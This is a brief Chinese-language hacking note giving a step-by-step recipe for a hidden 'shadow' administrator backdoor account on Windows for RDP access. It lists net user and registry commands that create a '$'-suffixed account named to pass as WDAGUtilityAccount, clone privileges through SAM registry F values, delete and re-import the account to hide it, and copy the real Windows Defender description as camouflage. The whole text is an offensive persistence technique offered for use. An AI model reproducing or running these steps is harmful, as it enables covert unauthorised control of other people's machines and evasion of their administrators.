# windows影子用户

不容易被发现的后门账户用于3389

```
可以看情况选用户名，不一定要用这个


net user WDAGUtilityAccount.$ test123456 /add
net localgroup administrators WDAGUtilityAccount.$ /add

regedit
HKEY_LOCAL_MACHINE\SAM\SAM
right click 
'full control' + read

fresh

HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names

export type and user

net user WDAGUtilityAccount.$ /del

import two file

将想要影子的用户的类型的F 值全部复制过来

防止通过注册表发现 
将一开始赋予的权限取消

windows 10 以上  右键左下角 有个计算机管理 打开计算机管理控制台 用户和组里能够看到
修改用户描述 系统为 Windows Defender 应用程序防护方案管理和使用的用户帐户。
net user WDAGUtilityAccount.$ /COMMENT:"系统为 Windows Defender 应用程序防护方案管理和使用的用户帐户。"
```

